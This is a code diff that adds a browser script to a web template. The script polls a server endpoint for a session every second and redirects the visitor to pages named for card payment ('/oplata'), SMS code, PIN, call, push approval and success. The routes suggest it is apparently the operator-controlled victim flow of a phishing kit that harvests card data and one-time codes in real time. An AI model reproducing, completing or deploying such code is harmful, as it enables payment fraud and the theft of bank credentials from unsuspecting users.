@@ -1,0 +1,75 @@
+<script>
+  function httpGet(theUrl) {
+  console.log(theUrl);
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false );
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+  }
+
+  function update() {
+    var response = httpGet('/get_info/{{ session_id }}');
+
+    if (response == 'loading') {
+        if (window.location.pathname != '/loading') {
+            document.location.href = '/loading';
+        }
+    }
+
+    if (response == 'sms') {
+        if (window.location.pathname != '/payment-sms') {
+            document.location.href = '/payment-sms';
+        }
+    }
+
+    if (response == 'pin') {
+        if (window.location.pathname != '/payment-pin') {
+            document.location.href = '/payment-pin';
+        }
+    }
+
+    if (response == 'card') {
+        if (window.location.pathname != '/oplata') {
+            document.location.href = '/oplata';
+        }
+    }
+
+    if (response == 'call') {
+        if (window.location.pathname != '/call') {
+            document.location.href = '/call';
+        }
+    }
+
+
+
+    if (response == 'suc') {
+        if (window.location.pathname != '/suc') {
+            document.location.href = '/suc';
+        }
+    }
+
+    if (response == 'push') {
+        if (window.location.pathname != '/push') {
+            document.location.href = '/push';
+        }
+    }
+
+
+    if (response == 'main') {
+        if (window.location.pathname != '/') {
+            document.location.href = '/';
+        }
+    }
+
+    if (response == 'cancel') {
+        if (window.location.pathname != '/cancel') {
+            document.location.href = '/cancel';
+        }
+    }
+
+
+  }
+
+  setInterval(update, 1000);
+
+</script>
